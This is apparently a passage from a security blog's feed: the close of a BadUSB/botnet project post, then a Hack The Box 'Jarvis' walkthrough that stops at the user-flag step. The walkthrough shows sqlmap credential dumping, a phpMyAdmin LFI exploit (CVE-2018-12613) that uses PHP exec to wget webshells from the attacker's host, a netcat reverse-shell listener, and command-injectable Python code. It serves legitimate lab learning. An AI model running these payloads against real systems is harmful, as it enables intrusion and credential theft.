&lt;p&gt;Ultimately our BadUSB devices were extremely successful on all platforms, despite our inability to use the same device for each. Our botnet endeavor was less successful in the end, but we learned a great deal, and if we had time to continue the project we’re aware of what direction we would go in to achieve what we were trying to this semester. Time was our greatest limiting factor for this project.&lt;/p&gt;

&lt;h2 id=&quot;references&quot;&gt;References&lt;/h2&gt;
&lt;ol&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/malwaredllc/byob&quot;&gt;Build Your Own Botnet&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/kbeflo/digispark-payloads&quot;&gt;DigiSpark Payloads&lt;/a&gt;.&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://digistump.com/board/index.php?topic=2612.0&quot;&gt;DigiSpark Apple Keyboard Mod Explanation&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/chris408/digispark-usbkey-board/blob/master/usbconfig.h&quot;&gt;DigiSpark Apple Keyboard &lt;code class=&quot;highlighter-rouge&quot;&gt;usbconfig.h&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;</content><author><name>Ryan Kozak</name></author><category term="Security" /><category term="BadUSB" /><category term="Botnet" /><category term="DigiSpark" /><category term="BYOB" /><category term="Build Your Own Botnet" /><summary type="html"></summary></entry><entry><title type="html">Hack The Box - Jarvis</title><link href="http://0.0.0.0:4000/hack-the-box-jarvis/" rel="alternate" type="text/html" title="Hack The Box - Jarvis" /><published>2019-11-09T00:00:00+00:00</published><updated>2021-06-23T16:11:24+00:00</updated><id>http://0.0.0.0:4000/hack-the-box-jarvis</id><content type="html" xml:base="http://0.0.0.0:4000/hack-the-box-jarvis/">&lt;p&gt;&lt;img src=&quot;/wp-content/uploads/2019/07/jarvis/badge.png&quot; alt=&quot;Hack The Box Writeup&quot; /&gt;&lt;/p&gt;

&lt;h1 id=&quot;information-gathering&quot;&gt;Information Gathering&lt;/h1&gt;

&lt;h2 id=&quot;nmap&quot;&gt;Nmap&lt;/h2&gt;
&lt;p&gt;We begin our reconnaissance by running a port scan with Nmap, checking default scripts and testing for vulnerabilities.&lt;/p&gt;

&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;root@kali:/media/sf_Research#&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-sVC&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; 10.10.10.143
&lt;span class=&quot;go&quot;&gt;Starting Nmap 7.70 ( https://nmap.org ) at 2019-07-22 22:36 EDT
Nmap scan report for 10.10.10.143
Host is up (0.35s latency).
Not shown: 65531 closed ports
PORT      STATE    SERVICE VERSION
22/tcp    open     ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey: 
|   2048 03:f3:4e:22:36:3e:3b:81:30:79:ed:49:67:65:16:67 (RSA)
|   256 25:d8:08:a8:4d:6d:e8:d2:f8:43:4a:2c:20:c8:5a:f6 (ECDSA)
|_  256 77:d4:ae:1f:b0:be:15:1f:f8:cd:c8:15:3a:c3:69:e1 (ED25519)
80/tcp    open     http    Apache httpd 2.4.25 ((Debian))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Stark Hotel
5355/tcp  filtered llmnr
64999/tcp open     http    Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Site doesnt have a title (text/html).
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;Service Info: OS: Linux;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;CPE: cpe:/o:linux:linux_kernel
&lt;span class=&quot;go&quot;&gt;
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 3380.59 seconds

&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;From the above output we can see that ports, &lt;strong&gt;22&lt;/strong&gt;, &lt;strong&gt;80&lt;/strong&gt;, &lt;strong&gt;5355&lt;/strong&gt;, and &lt;strong&gt;64999&lt;/strong&gt; are open.&lt;/p&gt;

&lt;p&gt;We know the common ports for ssh and http are open, and we’ll explore those in a moment. &lt;a href=&quot;https://en.wikipedia.org/wiki/Link-Local_Multicast_Name_Resolution&quot;&gt;Link-Local Multicast Name Resolution&lt;/a&gt; is running on port &lt;strong&gt;5355&lt;/strong&gt;, and the path we’ll be taking to get root doesn’t involve that, but I’m interested to read other hackers’ writeups to see if there is another method to root involving port &lt;strong&gt;5355&lt;/strong&gt;. It looks like port &lt;strong&gt;64999&lt;/strong&gt; serves a ban notice, but that never comes into play for us either.&lt;/p&gt;

&lt;h2 id=&quot;http-enumeration&quot;&gt;HTTP Enumeration&lt;/h2&gt;

&lt;p&gt;Browsing to port &lt;strong&gt;80&lt;/strong&gt;, we come across the website for the Stark Hotel. The site is written in PHP, but doesn’t appear to be running any known CMS.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/wp-content/uploads/2019/07/jarvis/stark_hotel.png&quot; alt=&quot;The Stark Hotel&quot; /&gt;
&lt;strong&gt;Figure 1:&lt;/strong&gt; The Stark Hotel&lt;/p&gt;

&lt;p&gt;While we explore the Stark Hotel’s website manually, it’s a good idea to run a directory enumeration script in the background to find more interesting things. Since I’ve become a big fan of &lt;a href=&quot;https://github.com/maurosoria/dirsearch&quot;&gt;dirsearch&lt;/a&gt; that’s what we’ll use here. In this instance we’re using the default wordlist with &lt;code class=&quot;highlighter-rouge&quot;&gt;txt&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;php&lt;/code&gt; extensions, and telling it to run recursively.&lt;/p&gt;

&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;root@kali:~/Tools/dirsearch#&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;python3 dirsearch.py &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; http://10.10.10.143 &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; txt,php &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;
 _|. _ _  _  _  _ _|_    v0.3.8
(_||| _) (/_(_|| (_| )

Extensions: txt, php | HTTP method: get | Threads: 10 | Wordlist size: 6390 | Recursion level: 1

Error Log: /root/Tools/dirsearch/logs/errors-19-07-25_12-39-55.log

Target: http://10.10.10.143

[12:39:57] Starting: 
[12:43:54] 200 -   23KB - /index.php
[12:43:56] 200 -   23KB - /index.php/login/
[12:45:12] 200 -   14KB - /phpmyadmin/
[12:46:54] Starting: css/
[12:47:03] 200 -    6KB - /css/.DS_Store
[12:53:40] Starting: fonts/
[12:53:49] 200 -    8KB - /fonts/.DS_Store
[13:00:32] Starting: images/
[13:00:40] 200 -    6KB - /images/.DS_Store
[13:07:19] Starting: js/
[13:07:28] 200 -    6KB - /js/.DS_Store
[13:14:16] Starting: phpmyadmin/
[13:14:25] 200 -  274B  - /phpmyadmin/.editorconfig
[13:14:25] 200 -   24B  - /phpmyadmin/.eslintignore
[13:16:58] 200 -   19KB - /phpmyadmin/ChangeLog
[13:17:06] 200 -    3KB - /phpmyadmin/composer.json
[13:17:10] 200 -   89KB - /phpmyadmin/composer.lock
[13:17:14] 200 -    2KB - /phpmyadmin/CONTRIBUTING.md
[13:17:30] 200 -  958B  - /phpmyadmin/doc/
[13:17:44] 200 -    2KB - /phpmyadmin/examples/
[13:17:47] 200 -   22KB - /phpmyadmin/favicon.ico
[13:18:13] 200 -   14KB - /phpmyadmin/import.php
[13:18:16] 200 -   14KB - /phpmyadmin/index.php
[13:18:18] 200 -   14KB - /phpmyadmin/index.php/login/
[13:18:32] 200 -   18KB - /phpmyadmin/LICENSE
[13:18:32] 200 -   14KB - /phpmyadmin/license.php
[13:19:14] 200 -  733B  - /phpmyadmin/package.json
[13:19:24] 200 -   14KB - /phpmyadmin/phpinfo.php
[13:19:46] 200 -    1KB - /phpmyadmin/README
[13:19:51] 200 -   26B  - /phpmyadmin/robots.txt
[13:20:04] 200 -   10KB - /phpmyadmin/setup/
[13:20:18] 200 -    2KB - /phpmyadmin/sql/
[13:20:18] 200 -   14KB - /phpmyadmin/sql.php
[13:20:36] 200 -    8KB - /phpmyadmin/templates/
[13:20:41] 200 -  958B  - /phpmyadmin/tmp/
[13:20:57] 200 -    0B  - /phpmyadmin/vendor/autoload.php
[13:20:57] 200 -    0B  - /phpmyadmin/vendor/composer/autoload_classmap.php
[13:20:57] 200 -    0B  - /phpmyadmin/vendor/composer/autoload_namespaces.php
[13:20:57] 200 -    0B  - /phpmyadmin/vendor/composer/autoload_files.php
[13:20:57] 200 -    0B  - /phpmyadmin/vendor/composer/autoload_psr4.php
[13:20:57] 200 -    0B  - /phpmyadmin/vendor/composer/autoload_static.php
[13:20:57] 200 -    0B  - /phpmyadmin/vendor/composer/ClassLoader.php
[13:20:57] 200 -    0B  - /phpmyadmin/vendor/composer/autoload_real.php
[13:20:57] 200 -    1KB - /phpmyadmin/vendor/composer/LICENSE
[13:20:58] 200 -   32KB - /phpmyadmin/vendor/composer/installed.json
[13:21:13] Starting: server-status/
[13:28:15] Starting: doc/
[13:35:11] Starting: examples/
[13:45:28] Starting: libraries/
[13:56:16] Starting: setup/
[14:05:05] Starting: sql/
[14:13:28] Starting: templates/
[14:21:55] Starting: themes/
[14:30:43] Starting: tmp/

Task Completed

&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;I’ve omitted the &lt;code class=&quot;highlighter-rouge&quot;&gt;301&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;403&lt;/code&gt; responses from the output above so that it isn’t quite as long. Anyhow, the most important discovery made during directory enumeration is that of the &lt;code class=&quot;highlighter-rouge&quot;&gt;phpmyadmin&lt;/code&gt; directory and some of its exposed contents.&lt;/p&gt;

&lt;p&gt;We can gather that the version of &lt;code class=&quot;highlighter-rouge&quot;&gt;phpmyadmin&lt;/code&gt; installed is &lt;strong&gt;4.8.0&lt;/strong&gt;. There are a few ways to do this, but one of the ways is through the exposed change log file at &lt;code class=&quot;highlighter-rouge&quot;&gt;http://10.10.10.143/phpmyadmin/ChangeLog&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;This version is vulnerable to  &lt;a href=&quot;https://nvd.nist.gov/vuln/detail/CVE-2018-12613&quot;&gt;CVE-2018-12613&lt;/a&gt;,&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;An issue was discovered in phpMyAdmin 4.8.x before 4.8.2, in which an attacker can include (view and potentially execute) files on the server. The vulnerability comes from a portion of code where pages are redirected and loaded within phpMyAdmin, and an improper test for white-listed pages. An attacker must be authenticated, except in the “$cfg[‘AllowArbitraryServer’] = true” case (where an attacker can specify any host he/she is already in control of, and execute arbitrary code on phpMyAdmin) and the “$cfg[‘ServerDefault’] = 0” case (which bypasses the login requirement and runs the vulnerable code without any authentication).&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&quot;manual-exploration&quot;&gt;Manual Exploration&lt;/h3&gt;

&lt;p&gt;&lt;img src=&quot;/wp-content/uploads/2019/07/jarvis/room.png&quot; alt=&quot;Room 1: room.php?cod=1&quot; /&gt;
&lt;strong&gt;Figure 2:&lt;/strong&gt; Room 1: room.php?cod=1&lt;/p&gt;

&lt;p&gt;We also know that the site is running a custom PHP application for the Stark Hotel which appears as if it may have an SQL injection vulnerability in the way it handles displaying the rooms &lt;code class=&quot;highlighter-rouge&quot;&gt;http://10.10.10.143/room.php?cod=SOMETHINGDIRTY!&lt;/code&gt;.&lt;/p&gt;

&lt;h1 id=&quot;exploitation&quot;&gt;Exploitation&lt;/h1&gt;

&lt;h2 id=&quot;initial-foothold&quot;&gt;Initial Foothold&lt;/h2&gt;

&lt;p&gt;In order to exploit the local file inclusion vulnerability (&lt;a href=&quot;https://nvd.nist.gov/vuln/detail/CVE-2018-12613&quot;&gt;CVE-2018-12613&lt;/a&gt;) on the version of phpmyadmin running, which can lead to remote code execution, we need to get some login credentials.&lt;/p&gt;

&lt;h3 id=&quot;sqlmap&quot;&gt;sqlmap&lt;/h3&gt;
&lt;p&gt;Attempting SQL injection manually through the url bar didn’t get us very far. In this instance we turn to sqlmap to do the work for us (feel like script kiddie?). Below is the output for having sqlmap dump the output of the usernames and passwords it can find.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Note&lt;/strong&gt;: It should be noted that these were cached already because I first ran sqlmap with the &lt;code class=&quot;highlighter-rouge&quot;&gt;-a&lt;/code&gt; flag.&lt;/p&gt;

&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;root@kali:~#&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;sqlmap &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'http://10.10.10.143/room.php?cod=5'&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--users&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--passwords&lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;        ___
       __H__
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt; ___ ___[']_____ ___ ___  {1.3.6#&lt;/span&gt;stable&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;|_ -| . [']     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 11:56:36 /2019-07-22/

[11:56:36] [INFO] resuming back-end DBMS 'mysql' 
[11:56:36] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: cod (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: cod=5 AND 9234=9234

    Type: time-based blind
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;    Title: MySQL &amp;gt;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 5.0.12 AND time-based blind &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;query SLEEP&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;    Payload: cod=5 AND (SELECT 8600 FROM (SELECT(SLEEP(5)))FUdN)

    Type: UNION query
    Title: Generic UNION query (NULL) - 7 columns
    Payload: cod=-1326 UNION ALL SELECT NULL,CONCAT(0x716a716a71,0x67666f747663416d57796c4c674d574841464b6e62774362465953737151417651536f7a526e526e,0x7170787871),NULL,NULL,NULL,NULL,NULL-- rAJB
---
[11:56:37] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian 9.0 (stretch)
web application technology: Apache 2.4.25
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;back-end DBMS: MySQL &amp;gt;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 5.0.12
&lt;span class=&quot;go&quot;&gt;[11:56:37] [INFO] fetching database users
[11:56:37] [INFO] used SQL query returns 28 entries
database management system users [1]:                                                 
[*] 'DBadmin'@'localhost'

[11:56:37] [INFO] fetching database users password hashes
[11:56:37] [INFO] used SQL query returns 1 entry
do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] y
[11:56:41] [INFO] writing hashes to a temporary file '/tmp/sqlmapgPiv8o5143/sqlmaphashes-NceIbU.txt' 
do you want to perform a dictionary-based attack against retrieved password hashes? [Y/n/q] y
[11:56:44] [INFO] using hash method 'mysql_passwd'
[11:56:44] [INFO] resuming password 'imissyou' for hash '*2d2b7a5e4e637b8fba1d17f40318f277d29964d0' for user 'DBadmin'
database management system users password hashes:
[*] DBadmin [1]:
    password hash: *2D2B7A5E4E637B8FBA1D17F40318F277D29964D0
    clear-text password: imissyou

[11:56:44] [INFO] fetched data logged to text files under '/root/.sqlmap/output/10.10.10.143'

[*] ending @ 11:56:44 /2019-07-22/

&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Above we see that sqlmap has found the password for the user &lt;code class=&quot;highlighter-rouge&quot;&gt;DBadmin&lt;/code&gt; to be &lt;code class=&quot;highlighter-rouge&quot;&gt;imissyou&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Now that we have the admin login credentials to MySQL we are able to login to &lt;code class=&quot;highlighter-rouge&quot;&gt;phpmyadmin&lt;/code&gt; and exploit it to gain a shell.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/wp-content/uploads/2019/07/jarvis/phpmyadmin_loggedin.png&quot; alt=&quot;phpMyAdmin control panel.&quot; /&gt;
&lt;strong&gt;Figure 3:&lt;/strong&gt; phpMyAdmin control panel.&lt;/p&gt;

&lt;h3 id=&quot;apache-setup&quot;&gt;Apache Setup&lt;/h3&gt;
&lt;p&gt;I’m already aware from previous machines that &lt;a href=&quot;https://hackthebod.eu&quot;&gt;HTB’s&lt;/a&gt; boxes don’t allow connecting to github in order to download things we regularly need. So, this time we’re going to use Kali’s apache server to host some of our own tools to easily download to the box when we get our first shell. We will start the apache service on kali with &lt;code class=&quot;highlighter-rouge&quot;&gt;service apache2 start&lt;/code&gt;. Then, place our two php shells in the &lt;code class=&quot;highlighter-rouge&quot;&gt;/var/www/html&lt;/code&gt; directory, but with the &lt;code class=&quot;highlighter-rouge&quot;&gt;.txt&lt;/code&gt; extension instead of &lt;code class=&quot;highlighter-rouge&quot;&gt;.php&lt;/code&gt;. It’s always convenient to also include the latest versions of &lt;a href=&quot;https://github.com/diego-treitos/linux-smart-enumeration&quot;&gt;lse.sh&lt;/a&gt;, &lt;a href=&quot;https://github.com/DominicBreuker/pspy&quot;&gt;pyspy&lt;/a&gt;, and your public key.&lt;/p&gt;

&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;root@kali:/var/www/html#&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;total 4460
drwxr-xr-x 2 root root    4096 Jul 22 21:04 .
drwxr-xr-x 3 root root    4096 Feb 11 02:35 ..
-rw-r--r-- 1 root root     391 Jul 22 13:23 id_rsa.pub
-rw-r--r-- 1 root root   10701 Jan 30 02:12 index.html
-rw-r--r-- 1 root root   30972 Jul 22 13:23 lse.sh
-rw-r--r-- 1 root root    5493 Jul 22 13:23 php-reverse-shell.txt
-rwxrwx--- 1 root root 4468984 Jul 22 13:23 pspy64
-rw-r--r-- 1 root root   15744 Jul 22 13:23 shell.txt
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;cve-2018-12613&quot;&gt;CVE-2018-12613&lt;/h3&gt;
&lt;p&gt;In order to exploit the vulnerability, we first navigate to the SQL Tab and run the following query.&lt;/p&gt;

&lt;div class=&quot;language-sql highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;select&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'&amp;lt;?php exec(&quot;wget -O /var/www/html/shell.php http://10.10.14.61/shell.txt &amp;amp;&amp;amp; wget -O /var/www/html/rshell.php http://10.10.14.61/php-reverse-shell.txt &quot;);  ?&amp;gt;'&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;The query contains php calling &lt;code class=&quot;highlighter-rouge&quot;&gt;exec&lt;/code&gt; to execute shell commands which &lt;code class=&quot;highlighter-rouge&quot;&gt;wget&lt;/code&gt; the two php shells we put onto our Kali box’s apache server, and changing their extensions to &lt;code class=&quot;highlighter-rouge&quot;&gt;.php&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/wp-content/uploads/2019/07/jarvis/if_1.png&quot; alt=&quot;CVE-2018-12613 Setp 1.&quot; /&gt;
&lt;strong&gt;Figure 4:&lt;/strong&gt; Paset in malicious query containing php code, click ‘go’.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/wp-content/uploads/2019/07/jarvis/if2.png&quot; alt=&quot;CVE-2018-12613 Setp 2.&quot; /&gt;
&lt;strong&gt;Figure 5:&lt;/strong&gt; Query executed, malicious php code stored in database.&lt;/p&gt;

&lt;p&gt;To execute the code we’ve just stored, we must first determine the value of our session variable, and append it to the url &lt;code class=&quot;highlighter-rouge&quot;&gt;http://10.10.10.143/phpmyadmin/index.php?target=db_sql.php%253f/../../../../../../../../var/lib/php/sessions/sess_FILLMEINS&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;For this we use the &lt;a href=&quot;https://addons.mozilla.org/en-US/firefox/addon/cookie-editor/&quot;&gt;Cookie-Editor&lt;/a&gt; Firefox Extension, and check the value of the &lt;code class=&quot;highlighter-rouge&quot;&gt;phpMyAdmin&lt;/code&gt; cookie.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/wp-content/uploads/2019/07/jarvis/if3.png&quot; alt=&quot;CVE-2018-12613 Setp 2.&quot; /&gt;
&lt;strong&gt;Figure 6:&lt;/strong&gt; phpMyAdmin session.&lt;/p&gt;

&lt;p&gt;Now that the session variable is known we navigate to the url in order to execute our php code.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://10.10.10.143/phpmyadmin/index.php?target=db_sql.php%253f/../../../../../../../../var/lib/php/sessions/sess_rgaqjb5lk26btifbs4alv75bj4hm1ljj
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/wp-content/uploads/2019/07/jarvis/if4.png&quot; alt=&quot;CVE-2018-12613 Setp 2.&quot; /&gt;
&lt;strong&gt;Figure 7:&lt;/strong&gt; php execution.&lt;/p&gt;

&lt;p&gt;We now have our p0wny webshell available on &lt;code class=&quot;highlighter-rouge&quot;&gt;http://10.10.10.143/shell.php&lt;/code&gt;. Our reverse shell is also available, and that’s what we’re going to use mostly for the rest of the box. Start netcat to have it listen &lt;code class=&quot;highlighter-rouge&quot;&gt;nc -lvp 4444&lt;/code&gt;. Then call &lt;code class=&quot;highlighter-rouge&quot;&gt;rshell.php&lt;/code&gt; either by navigating to &lt;code class=&quot;highlighter-rouge&quot;&gt;http://10.10.10.143/rshell.php&lt;/code&gt;, or via the web shell. We issue the following command to get a more interactive shell.&lt;/p&gt;

&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;python3 -c 'import pty;&lt;/span&gt;pty.spawn&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;/bin/bash&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/wp-content/uploads/2019/07/jarvis/ncshell1.png&quot; alt=&quot;php reverse shell.&quot; /&gt;
&lt;strong&gt;Figure 8:&lt;/strong&gt; php reverse shell as www-data user.&lt;/p&gt;

&lt;h3 id=&quot;linux-smart-enumeration&quot;&gt;Linux Smart Enumeration&lt;/h3&gt;

&lt;p&gt;After grabbing Linux Smart Enumeration we run it and discover two particularly interesting things.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/wp-content/uploads/2019/07/jarvis/lse.png&quot; alt=&quot;Linux Smart Enumeration.&quot; /&gt;
&lt;strong&gt;Figure 9:&lt;/strong&gt; Linux Smart Enumeration.&lt;/p&gt;

&lt;p&gt;We see that there are uncommon setuid binaries, and that the user &lt;code class=&quot;highlighter-rouge&quot;&gt;www-data&lt;/code&gt; has access to run an administration tool as &lt;code class=&quot;highlighter-rouge&quot;&gt;pepper&lt;/code&gt; (without entering a password).&lt;/p&gt;

&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;go&quot;&gt;User www-data may run the following commands on jarvis:
    (pepper : ALL) NOPASSWD: /var/www/Admin-Utilities/simpler.py
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;user-flag&quot;&gt;User Flag&lt;/h2&gt;

&lt;p&gt;Let’s read the source code for &lt;strong&gt;&lt;em&gt;&lt;a href=&quot;https://gist.github.com/d0n601/270adf14cca07f438d3564ec3333f84c&quot;&gt;simpler.py&lt;/a&gt;&lt;/em&gt;&lt;/strong&gt;. The function that jumps out as exploitable is &lt;code class=&quot;highlighter-rouge&quot;&gt;exec_ping()&lt;/code&gt;, since it directly runs user input.&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;exec_ping&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;forbidden&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&amp;amp;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;';'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'-'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'`'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'||'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'|'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;command&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'Enter an IP: '&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;forbidden&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;command&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'Got you'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
            &lt;span class=&quot;nb&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'ping '&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;command&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Full source for &lt;strong&gt;&lt;em&gt;&lt;a href=&quot;https://gist.github.com/d0n601/270adf14cca07f438d3564ec3333f84c&quot;&gt;simpler.py&lt;/a&gt;&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;

